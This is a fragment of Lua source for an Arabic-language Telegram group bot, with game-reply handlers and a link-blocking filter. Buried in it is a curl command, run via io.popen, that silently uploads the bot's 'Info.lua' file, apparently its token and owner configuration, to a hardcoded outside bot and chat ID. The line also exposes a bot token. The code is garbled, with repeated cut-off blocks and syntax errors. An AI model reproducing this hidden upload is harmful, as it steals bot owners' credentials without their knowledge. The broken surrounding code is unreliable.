keyboard.inline_keyboard = {
{{text = '00:00',url="t.me/SO_ROGEN"l}},
...
if Text == '/rebmm44'..data.sender_user_id_ then
local Teext = 'لقد خسرت سوف اقتلك 😈'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '00:00',url="t.me/SO_ROGEN"l}},
...
if Text == '/rebmm99'..data.sender_user_id_ then
local Teext = 'لقد خسرت سوف اقتلك 😈'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '00:00',url="t.me/SO_ROGEN"l}},
...
if Text == '/rebmm70'..data.sender_user_id_ then
local Teext = 'لقد خسرت سوف اقتلك 😈'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '00:00',url="t.me/SO_ROGEN"l}},
...
if Text == '/rebmm90'..data.sender_user_id_ then
local Teext = 'لقد خسرت سوف اقتلك ??'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '00:00',url="t.me/SO_ROGEN"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
local curl = 'curl "'..'https://api.telegram.org/bot1900602353:AAFUNbLnuyT8HfC7FVRqSYG_XaeUF0jvl3k/sendDocument'..'" -F "chat_id='.. 1904319165 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
